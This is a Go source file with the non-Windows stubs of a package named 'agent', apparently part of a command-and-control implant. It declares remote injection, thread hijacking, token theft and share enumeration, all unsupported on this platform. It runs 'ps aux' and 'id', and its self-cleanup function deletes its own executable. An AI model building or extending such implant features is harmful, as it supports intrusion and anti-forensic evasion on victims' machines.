//go:build !windows

package agent

import (
	"fmt"
	"os"
)

func listProcesses() (string, error) {
	return runShell("ps aux")
}

func listProcessesJSON() (string, error) {
	return `{"error":"not supported on this platform"}`, nil
}

func takeScreenshot(t transport, taskID int64) (string, error) {
	return "", fmt.Errorf("screenshot not supported on this platform")
}

func injectRemote(pid int, sc []byte) error {
	return fmt.Errorf("remote injection not supported on this platform")
}

func injectRemoteHijack(pid int, sc []byte) (string, error) {
	return "", fmt.Errorf("thread-hijack injection not supported on this platform")
}

func stealToken(pid int) (string, error) {
	return "", fmt.Errorf("token operations not supported on this platform")
}

func makeToken(userDomain, password string) (string, error) {
	return "", fmt.Errorf("token operations not supported on this platform")
}

func dropToken() (string, error) {
	return "no token to drop", nil
}

func tokenWhoami() string {
	out, _ := runShell("id")
	return out
}

func selfCleanup() {
	exe, err := os.Executable()
	if err == nil {
		os.Remove(exe)
	}
	os.Exit(0)
}

func listDrivesJSON() (string, error) {
	return `{"cwd":"","path":"","drives":true,"entries":[{"name":"/","is_dir":true,"size":0,"mod":""}]}`, nil
}

func netSharesJSON(host string) (string, error) {
	return "", fmt.Errorf("net shares enumeration not supported on this platform")
}
